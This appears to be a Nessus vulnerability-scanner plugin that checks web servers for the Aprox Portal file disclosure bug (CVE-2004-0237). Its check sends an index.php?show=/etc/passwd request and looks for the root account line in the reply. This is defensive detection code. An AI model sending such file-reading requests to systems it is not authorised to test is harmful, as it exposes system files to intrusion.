#
# (C) Tenable Network Security
#

if(description)
{
 script_id(12031);
 script_cve_id("CVE-2004-0237");
 script_bugtraq_id(9540);
 script_version ("$Revision: 1.7 $");
 
 name["english"] = "aprox portal file disclosure";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running Aprox Portal - a PHP-based content management
system.

There is a bug in this software which may allow an attacker to read
arbitrary files on the remote web server with the privileges of the
web user.

Solution : Upgrade to the latest version of Aprox Portal
Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Checks Aprox Portal";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 req = string(dir,"/index.php?show=/etc/passwd");
 req = http_get(item:req, port:port);
 buf = http_keepalive_send_recv(port:port, data:req);
 if( buf == NULL ) exit(0);

 if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf)){
 	security_hole(port);
	exit(0);
	}
}
